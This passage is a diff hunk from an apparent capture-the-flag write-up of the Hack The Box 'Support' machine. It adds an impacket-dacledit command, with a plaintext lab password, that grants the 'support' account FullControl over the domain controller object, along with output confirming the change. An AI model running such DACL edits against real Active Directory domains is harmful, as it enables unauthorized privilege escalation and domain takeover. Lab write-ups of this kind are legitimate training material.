@@ -253,5 +253,15 @@ Impacket v0.14.0.dev0+20260805.100140.701354e9 - Copyright Fortra, LLC and its a
 First ill grant myself ownership of the object
 
 ```python
+impacket-dacledit -action 'write' -rights 'FullControl' -principal 'support' -target-dn 'CN=DC,OU=Domain Controllers,DC=support,DC=htb' 'support.htb'/'support':'Ironside47pleasure40Watchful' -dc-ip 10.129.230.181
+Impacket v0.14.0.dev0+20260805.100140.701354e9 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] DACL backed up to dacledit-20260811-163153.bak
+[*] DACL modified successfully!
+```
+
+Now ill give myself GenericAll (FullControl)
+
+```python
 
 ```
